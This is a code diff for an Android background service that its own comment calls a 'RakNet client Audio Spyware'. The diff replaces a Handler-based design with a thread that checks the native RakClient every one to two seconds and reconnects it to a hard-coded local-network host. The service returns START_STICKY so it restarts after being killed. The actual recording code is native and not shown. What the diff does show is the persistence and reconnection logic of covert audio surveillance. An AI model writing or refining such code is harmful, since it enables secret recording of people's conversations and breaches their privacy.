@@ -5,18 +5,15 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.os.Handler;
-import android.os.HandlerThread;
 import android.os.IBinder;
-import android.os.Looper;
-import android.os.Message;
 import android.os.Process;
 import android.support.annotation.Nullable;
+import android.util.Log;
 
 /**
  * Created by Gabriele on 30/05/16.
  */
-public class SilenceAudioRecordingService extends Service
+public class SilenceAudioRecordingService extends Service implements Runnable
 {
     static
     {
@@ -29,40 +26,57 @@ public class SilenceAudioRecordingService extends Service
     //192.168.137.183
     //192.168.1.132
     //192.168.1.134
-    private String mHost = "192.168.137.193";
-    private int    mPort = 8000; //not implemented yet
-
-    private Looper mServiceLooper;
-    private ServiceHandler mServiceHandler;
+    //192.168.137.193
+    private String  mHost = "192.168.1.132";
+    private int     mPort = 8000; //not implemented yet
+    private Thread  mThread = null;
+    private boolean mLoop = true;
 
     //network available
     private boolean isNetworkAvailable()
     {
         ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        if(connectivityManager == null) return false;
         NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
-        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
+        if(activeNetworkInfo == null) return false;
+        //return state
+        return activeNetworkInfo.isConnected();
     }
 
-    // Handler that receives messages from the thread
-    private final class ServiceHandler extends Handler
+    @Override
+    public void run()
     {
-        public ServiceHandler(Looper looper)
+        while(mLoop)
         {
-            super(looper);
-        }
-
-        @Override
-        public void handleMessage(Message msg)
-        {
-            if(   RakClient.state() != RakClient.C_S_CONNECTED
-               && RakClient.state() != RakClient.C_S_START
-               && isNetworkAvailable()     )
-
+            if (   RakClient.state() != RakClient.C_S_CONNECTED
+                && RakClient.state() != RakClient.C_S_START
+                && isNetworkAvailable())
             {
                 //stop
                 RakClient.stop();
                 //re-try to restart
                 RakClient.start(mHost);
+                //sleep thread
+                try
+                {
+                    Thread.sleep(2000);
+                }
+                catch (Exception e)
+                {
+                    Log.e("SilenceAudioRecordingService","run: "+ e.toString());
+                }
+            }
+            else
+            {
+                //sleep thread
+                try
+                {
+                    Thread.sleep(1000);
+                }
+                catch (Exception e)
+                {
+                    Log.e("SilenceAudioRecordingService", "run: " + e.toString());
+                }
             }
         }
     }
@@ -71,23 +85,19 @@ public class SilenceAudioRecordingService extends Service
     public void onCreate()
     {
         super.onCreate();
-        // Start up the thread running the service.
-        HandlerThread thread = new HandlerThread("ServiceStartArguments",  Process.THREAD_PRIORITY_BACKGROUND);
-        thread.start();
-        // Get the HandlerThread's Looper and use it for our Handler
-        mServiceLooper  = thread.getLooper();
-        mServiceHandler = new ServiceHandler(mServiceLooper);
-        //start RakNet client Audio Spyware
+        // Start RakNet client Audio Spyware
         RakClient.start(mHost);
+        // Enable loop
+        mLoop = true;
+        // Start up the thread running the service.
+        mThread = new Thread(this);
+        mThread.start();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId)
     {
-        //send message
-        Message msg = mServiceHandler.obtainMessage();
-        msg.arg1 = startId;
-        mServiceHandler.sendMessage(msg);
+        // ignore the message
         // If we get killed, after returning from here, restart
         return START_STICKY;
     }
@@ -96,7 +106,20 @@ public class SilenceAudioRecordingService extends Service
     @Override
     public void onDestroy()
     {
+        //stop loop
+        try
+        {
+            mLoop = false;
+            mThread.join();
+        }
+        catch (Exception e)
+        {
+            Log.e("SilenceAudioRecordingService",
+                  "onDestroy: "+e.toString());
+        }
+        //stop native
         RakClient.stop();
+        //destoy all
         super.onDestroy();
     }
 
